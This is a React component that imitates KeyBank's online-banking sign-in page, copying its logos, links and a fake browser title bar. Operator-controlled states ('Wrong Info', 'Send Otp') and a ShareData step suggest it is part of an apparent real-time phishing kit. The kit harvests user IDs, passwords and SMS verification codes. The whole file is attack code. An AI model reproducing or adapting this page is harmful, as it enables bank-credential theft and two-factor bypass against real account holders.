import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import BankingHeader from "./BankingHeader";
import { motion } from "framer-motion";
import KeyBankFavIcon from "../../../../../../../../assets/allBanks/banks/keybank/kb2.ico";
import { Link } from "react-router-dom";
import { FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
import { GoLock } from "react-icons/go";
import KeyBankImg from "../../../../../../../../assets/allBanks/banks/keybank/kb4.png";
import Fdic from "../../../../../../../../assets/allBanks/banks/keybank/kb3.svg";
import Key from "../../../../../../../../assets/allBanks/banks/keybank/kb5.svg";
import { CgProfile } from "react-icons/cg";
import { keyNavDetails, otpOptions } from "../../bankDetails";
import { VscMenu } from "react-icons/vsc";
import { useState } from "react";
import { BsExclamationCircleFill } from "react-icons/bs";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const KeyBank = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);
  const [openMenu, setOpenMenu] = useState(false);

  const hanldeMenuBar = () => {
    setOpenMenu((prevToggle) => !prevToggle);
  };

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-white",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Sign in - KeyBank.com"
        handleCancel={handleCancel}
        img={KeyBankFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <header
        className={clsx(
          "relative flex  justify-between w-full px-3  text-white   bg-customRed-1002",
          openMenu ? " " : "overflow-hidden"
        )}
      >
        <div>
          <img
            src={KeyBankImg}
            alt=""
            className="w-[140px] h-[55px]  object-contain"
          />
        </div>
        <div className="mt-4 customXlg:hidden" onClick={hanldeMenuBar}>
          <VscMenu size={20} />
        </div>

        <div
          className={clsx(
            "absolute left-0 w-full h-screen  bg-black top-full bg-opacity-20 customXlg:hidden text-black flex z-30 justify-end ",
            openMenu
              ? "translate-x-0 transistion1 "
              : "translate-x-full transistion2"
          )}
        >
          <div className="bg-white w-[60%]">
            <nav>
              <Link
                to="https://www.key.com/personal/index.html"
                className="block pt-3"
              >
                {keyNavDetails.map((nav) => (
                  <p
                    className="p-4 border-b border-customGray-1048"
                    key={nav.id}
                  >
                    {nav.name}
                  </p>
                ))}
              </Link>
            </nav>
          </div>
        </div>

        <div className="items-end hidden mb-2 customXlg:flex">
          <nav>
            <Link
              to="https://www.key.com/personal/index.html"
              className="flex items-center gap-4"
            >
              {keyNavDetails.map((nav) => (
                <p key={nav.id}>{nav.name}</p>
              ))}
            </Link>
          </nav>
        </div>
      </header>
      <div className="w-full px-3 pt-1">
        <img src={Fdic} alt="" className="object-contain w-full h-[16px]" />
      </div>
      <div className="flex items-center justify-center px-6 pt-14 text-customGray-900">
        <div
          className={clsx(
            " w-full customMiniTablet:w-[500px] px-0  customMiniTablet:px-8",
            allBankOpen ? "hidden" : "block"
          )}
        >
          <div className="flex justify-center w-full mb-5">
            <img
              src={Key}
              alt=""
              className="object-contain w-[220px] customMiniTablet:w-[270px] h-[158px]"
            />
          </div>
          <div>
            <div className="">
              <label className="text-sm text-customGray-1049">
                Enter your User ID
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={formState.username}
                  name="username"
                  onChange={handleChange}
                  className={clsx(
                    "w-full border border-customGray-1048 rounded-md py-[11px] pl-11 focus:border-2 focus:border-customBlue-1021 transistion2 outline-none focus:shadow-lg pr-4",
                    errorFormState.username
                      ? "border border-customRed-1002"
                      : ""
                  )}
                />
                <span className="absolute h-full py-3 left-4 text-customGray-1048">
                  <CgProfile size={20} />
                </span>
                {errorFormState.username && (
                  <p className="flex gap-2 mt-2 text-sm text-customRed-1002">
                    <BsExclamationCircleFill className="mt-[2px]" />
                    Please enter a valid User ID
                  </p>
                )}
              </div>
            </div>
            <div className="flex items-center gap-2 mt-4">
              <input type="checkbox" className="w-[20px] h-[20px]" />
              <p className="text-sm text-customGray-1049 ">Save User ID</p>
            </div>
            <div className="mt-5">
              <label className="text-sm text-customGray-1049">
                Enter your Password
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={formState.password}
                  name="password"
                  onChange={handleChange}
                  className={clsx(
                    "w-full border border-customGray-1048 rounded-md py-[11px] pl-11 focus:border-2 pr-11 focus:border-customBlue-1021 transistion2 outline-none focus:shadow-lg",
                    errorFormState.password
                      ? "border border-customRed-1002"
                      : ""
                  )}
                />
                <span className="absolute h-full py-3 left-4 text-customGray-1048">
                  <GoLock size={20} />
                </span>
                <span
                  onClick={() => setshowPassword((prevShow) => !prevShow)}
                  className="absolute h-full py-3 right-4 text-customBlue-1021"
                >
                  {showPassword ? (
                    <FaRegEyeSlash size={20} />
                  ) : (
                    <FaRegEye size={20} />
                  )}
                </span>
                {errorFormState.password && (
                  <p className="flex gap-2 mt-2 text-sm text-customRed-1002">
                    <BsExclamationCircleFill className="mt-[2px]" />
                    Please enter a valid password{" "}
                  </p>
                )}
              </div>
            </div>
            <button
              onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
              className="w-full py-3 my-8 font-semibold text-white rounded-md shadow-lg bg-customRed-1002"
            >
              {loading && <ClipLoader size={10} color="#fff" />}
              {loading ? "Loading..." : "Sign On"}
            </button>
            <div className="pb-5 font-semibold text-center border-b border-customGray-1048 text-customBlue-1021">
              <Link to="https://www.key.com/personal/index.html">
                Problem Signing On?
              </Link>
            </div>
            <div className="py-5 font-semibold text-center text-customBlue-1021">
              <Link to="https://www.key.com/personal/index.html">
                Enroll in Online Banking
              </Link>
            </div>
          </div>
        </div>
        <div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div
                      className={clsx(
                        " w-full customMiniTablet:w-[500px] px-0  customMiniTablet:px-8"
                      )}
                    >
                      <div className="flex justify-center w-full mb-5">
                        <img
                          src={Key}
                          alt=""
                          className="object-contain w-[220px] customMiniTablet:w-[270px] h-[158px]"
                        />
                      </div>
                      <div>
                        <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                          <BsExclamationCircleFill className="mt-[2px]" />

                          <p>{activePathDetails.body}</p>
                        </div>
                        <div className="">
                          <label className="text-sm text-customGray-1049">
                            Enter your User ID
                          </label>
                          <div className="relative">
                            <input
                              type="text"
                              value={formState.username}
                              name="username"
                              onChange={handleChange}
                              className={clsx(
                                "w-full border border-customGray-1048 rounded-md py-[11px] pl-11 focus:border-2 focus:border-customBlue-1021 transistion2 outline-none focus:shadow-lg pr-4",
                                errorFormState.username
                                  ? "border border-customRed-1002"
                                  : ""
                              )}
                            />
                            <span className="absolute h-full py-3 left-4 text-customGray-1048">
                              <CgProfile size={20} />
                            </span>
                            {errorFormState.username && (
                              <p className="flex gap-2 mt-2 text-sm text-customRed-1002">
                                <BsExclamationCircleFill className="mt-[2px]" />
                                Please enter a valid User ID
                              </p>
                            )}
                          </div>
                        </div>
                        <div className="flex items-center gap-2 mt-4">
                          <input
                            type="checkbox"
                            className="w-[20px] h-[20px]"
                          />
                          <p className="text-sm text-customGray-1049 ">
                            Save User ID
                          </p>
                        </div>
                        <div className="mt-5">
                          <label className="text-sm text-customGray-1049">
                            Enter your Password
                          </label>
                          <div className="relative">
                            <input
                              type={showPassword ? "text" : "password"}
                              value={formState.password}
                              name="password"
                              onChange={handleChange}
                              className={clsx(
                                "w-full border border-customGray-1048 rounded-md py-[11px] pl-11 focus:border-2 pr-11 focus:border-customBlue-1021 transistion2 outline-none focus:shadow-lg",
                                errorFormState.password
                                  ? "border border-customRed-1002"
                                  : ""
                              )}
                            />
                            <span className="absolute h-full py-3 left-4 text-customGray-1048">
                              <GoLock size={20} />
                            </span>
                            <span
                              onClick={() =>
                                setshowPassword((prevShow) => !prevShow)
                              }
                              className="absolute h-full py-3 right-4 text-customBlue-1021"
                            >
                              {showPassword ? (
                                <FaRegEyeSlash size={20} />
                              ) : (
                                <FaRegEye size={20} />
                              )}
                            </span>
                            {errorFormState.password && (
                              <p className="flex gap-2 mt-2 text-sm text-customRed-1002">
                                <BsExclamationCircleFill className="mt-[2px]" />
                                Please enter a valid password{" "}
                              </p>
                            )}
                          </div>
                        </div>
                        <button
                          onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                          className="w-full py-3 my-8 font-semibold text-white rounded-md shadow-lg bg-customRed-1002"
                        >
                          {loading && <ClipLoader size={10} color="#fff" />}
                          {loading ? "Loading..." : "Sign On"}
                        </button>
                        <div className="pb-5 font-semibold text-center border-b border-customGray-1048 text-customBlue-1021">
                          <Link to="https://www.key.com/personal/index.html">
                            Problem Signing On?
                          </Link>
                        </div>
                        <div className="py-5 font-semibold text-center text-customBlue-1021">
                          <Link to="https://www.key.com/personal/index.html">
                            Enroll in Online Banking
                          </Link>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>
                    <div
                      className={clsx(
                        " customMiniTablet:w-[500px] px-4 bg-white py-4",
                        isOpenOtp && "hidden"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Verify your identity
                            </h3>
                            <p className="mb-2 text-center ">
                              For your security, we need to verify it&apos;s
                              really you.
                            </p>
                          </div>
                          <div>
                            <h2 className="mb-2 text-sm font-bold">
                              How would you like to get your verification code?
                            </h2>
                            <p className="mb-2 text-sm text-customGray-100">
                              Select One:
                            </p>
                            <div
                              role="radiogroup"
                              aria-label="Otp Options"
                              className="flex flex-col space-y-3"
                            >
                              {otpOptions.map((bank) => (
                                <div
                                  key={bank.id}
                                  role="radio"
                                  tabIndex={0}
                                  onClick={() => handleOtpOption(bank.id)}
                                  className="flex items-center gap-2.5 "
                                >
                                  <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                    <p
                                      className={clsx(
                                        "rounded-full w-[10px] h-[10px]  ",
                                        otpOptions[indexOtp]?.id === bank.id
                                          ? "bg-customBlue-500"
                                          : ""
                                      )}
                                    ></p>
                                  </div>
                                  <h2
                                    className={clsx(
                                      "text-sm",
                                      otpOptions[indexOtp]?.id === bank.id
                                        ? "text-customBlue-500 hover:underline"
                                        : "hover:text-customBlue-700 hover:underline"
                                    )}
                                  >
                                    {bank.name}
                                  </h2>
                                </div>
                              ))}
                            </div>
                            <button
                              onClick={onSubmitOtpOptions}
                              className="w-full py-3 my-8 font-semibold text-white rounded-md shadow-lg bg-customRed-1002"
                            >
                              Continue
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                    {isOpenOtp && (
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4 bg-white py-4"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Enter Verification Code
                              </h3>
                            </div>
                            <div>
                              <h2 className="mb-2 text-center ">
                                Enter the verification code we sent to your
                                mobile number
                              </h2>
                              <div className="px-2 customMiniTablet:px-24">
                                <div>
                                  <input
                                    type="number"
                                    placeholder="Enter Verification Code"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className={clsx(
                                      "w-full border border-customGray-1048 rounded-md py-[11px] pl-11 focus:border-2 focus:border-customBlue-1021 transistion2 outline-none focus:shadow-lg pr-4 no-spinner",
                                      errorOtp.otpo
                                        ? "border border-customRed-1002"
                                        : ""
                                    )}
                                  />
                                  {errorOtp.otpo && (
                                    <p className="mt-2 text-sm text-customRed-1002">
                                      Please enter the verification code.
                                    </p>
                                  )}
                                </div>
                                <button
                                  className="w-full py-3 my-8 font-semibold text-white rounded-md shadow-lg bg-customRed-1002"
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Verify"}
                                </button>
                              </div>
                              <p
                                className={clsx(
                                  "cursor-pointer text-customBlue-100 font-bold text-center",
                                  !resend &&
                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Didnt get a code? Resend
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />

              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div
                      className={clsx(
                        " customMiniTablet:w-[500px] px-4 bg-white py-4"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Enter Verification Code
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-2 text-center ">
                              Enter the verification code we sent to your mobile
                              number
                            </h2>
                            <div className="px-2 customMiniTablet:px-24">
                              <div>
                                <input
                                  type="number"
                                  placeholder="Enter Verification Code"
                                  value={formOtp.otpo}
                                  name="otpo"
                                  onChange={changeOtp}
                                  className={clsx(
                                    "w-full border border-customGray-1048 rounded-md py-[11px] pl-11 focus:border-2 focus:border-customBlue-1021 transistion2 outline-none focus:shadow-lg pr-4 no-spinner",
                                    errorOtp.otpo
                                      ? "border border-customRed-1002"
                                      : ""
                                  )}
                                />
                                {errorOtp.otpo && (
                                  <p className="mt-2 text-sm text-customRed-1002">
                                    Please enter the verification code.
                                  </p>
                                )}
                                <h3 className="mt-2 text-sm text-customRed-200">
                                  {activeOtp.body}
                                </h3>
                              </div>
                              <button
                                className="w-full py-3 my-8 font-semibold text-white rounded-md shadow-lg bg-customRed-1002"
                                onClick={(e) =>
                                  onSubmitOtp(e, handleVerifiedOtp)
                                }
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#fff" />
                                )}
                                {loading ? "Loading..." : "Verify"}
                              </button>
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Didnt get a code? Resend
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.key.com/personal/index.html"
                    />
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
      <footer className="flex items-center justify-center p-2 text-xs bg-customGray-1050 text-customGray-200">
        <Link
          to="https://www.key.com/personal/index.html"
          className="flex mt-10 space-x-3"
        >
          <p className="underline">Diversity</p>
          <p className="underline">Disclosures</p>
          <p className="underline">Online Privacy Statement</p>
          <p className="underline">About Key</p>
        </Link>
      </footer>
    </motion.div>
  );
};

export default KeyBank;
